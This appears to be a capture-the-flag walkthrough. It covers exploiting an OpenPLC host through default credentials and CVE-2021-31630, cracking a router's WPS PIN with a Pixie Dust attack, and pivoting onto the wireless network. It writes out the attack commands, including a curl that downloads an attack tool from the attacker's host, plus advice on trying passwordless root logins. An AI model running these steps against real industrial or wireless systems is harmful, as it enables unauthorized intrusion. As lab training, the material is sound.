Phase 1

Initial Access — OpenPLC Default Creds + CVE-2021-31630

Default Credentials

OpenPLC default login: openplc : openplc
CVE-2021-31630 — How it works OpenPLC lets users upload custom C code as a "hardware layer" driver, which gets compiled and loaded by the PLC runtime. There's no validation on the uploaded code — so you can embed a reverse shell in the "driver." Since the OpenPLC process runs as root, the compiled code executes with root privileges.

We're root, but this machine is just a jumpbox. The real target is behind a wireless network.

Scan for Networks

root@attica02:~# iwlist wlan0 scanning
Cell 01 - Address: 02:00:00:00:01:00

          IE: IEEE 802.11i/WPA2 Version 1

Reading the scan output The hex 0050F204 in the IE field is the standard WPS (Wi-Fi Protected Setup) vendor identifier. This means plcrouter has WPS enabled — the perfect target for a Pixie Dust attack. Signal at -30 dBm is extremely strong (closer to 0 = stronger).
Phase 3

WiFi Cracking — WPS Pixie Dust Attack

Switch to Monitor Mode

# Must bring interface down before mode change
root@attica02:~# ip link set wlan0 down

# Set monitor mode (no airmon-ng on this box, use iw directly)
root@attica02:~# iw wlan0 set type monitor

# Bring it back up
root@attica02:~# ip link set wlan0 up
Why monitor mode? In normal (Managed) mode, the wireless card only receives packets addressed to it or broadcast. Monitor mode makes it a passive listener that captures all wireless traffic in the air — including the WPS handshake messages (M1/M3) needed for Pixie Dust.

Deploy oneshot.py

# No reaver/wash on the box — use pure Python oneshot.py instead
root@attica02:~# curl -L http://10.10.14.15:8888/oneshot.py -o /tmp/oneshot.py

# Fix missing wcwidth dependency
root@attica02:~# sed -i '/import wcwidth/d' /tmp/oneshot.py

Launch Pixie Dust Attack

root@attica02:~# python3 /tmp/oneshot.py -i wlan0 -b 02:00:00:00:01:00 -K

Pixie Dust explained Pixie Dust exploits a fatal flaw in how some router chipsets generate random numbers (Nonces) during the WPS handshake. Because the randomness is weak/predictable, the WPS PIN can be recovered offline from just the M1 and M3 messages — no brute-force needed. The entire attack takes seconds, not hours.
Phase 4

Joining the Wireless Network — Static IP (No DHCP!)

Connect to WiFi

# Create WPA config file
root@attica02:~# cat << 'EOF' > /tmp/x.conf
network={
    ssid="plcrouter"
    psk="NoWWEDoKnowWhaTisReal123!"
}
EOF

# Connect in background
root@attica02:~# wpa_supplicant -B -i wlan0 -c /tmp/x.conf
Successfully initialized wpa_supplicant
NEVER use dhclient — it will crash the box dhclient overwrites the default gateway, which kills your existing reverse shell through the wired interface. The jumpbox becomes unreachable and you lose everything. Always assign a static IP manually. 
# Assign static IP (gateway is 192.168.1.1 from DHCP traces)
root@attica02:~# ip addr add 192.168.1.50/24 dev wlan0

# Verify connectivity
root@attica02:~# ping -c 1 192.168.1.1

Appendix

Key Takeaways

The first root shell may just be the jumpbox.

Getting root doesn't mean the box is done. Always check for additional network interfaces (iwconfig, ip a) — there may be an entire hidden network to pivot into.

WPS = Pixie Dust vulnerability.

If iwlist scanning shows the 0050F204 vendor IE, WPS is enabled. Pixie Dust cracks weak random number generators in seconds, completely offline.

No tools? Adapt.

No airmon-ng → use iw. No reaver → use oneshot.py. Missing Python module → sed it out. Minimal environments are common on embedded/IoT targets.

Never run dhclient on a jumpbox.

It overwrites the default route and kills your shell. Always use ip addr add for static IP assignment when pivoting through a compromised host.

Chisel multi-port forwarding is essential for cross-network pivoting.

R:local:target:remote syntax lets you map multiple internal services through a single tunnel. Memorize this pattern.

OpenWrt ships with no root password.

Factory-default embedded devices are often completely open. After pivoting into an internal network, try SSH with root and no password on every device.
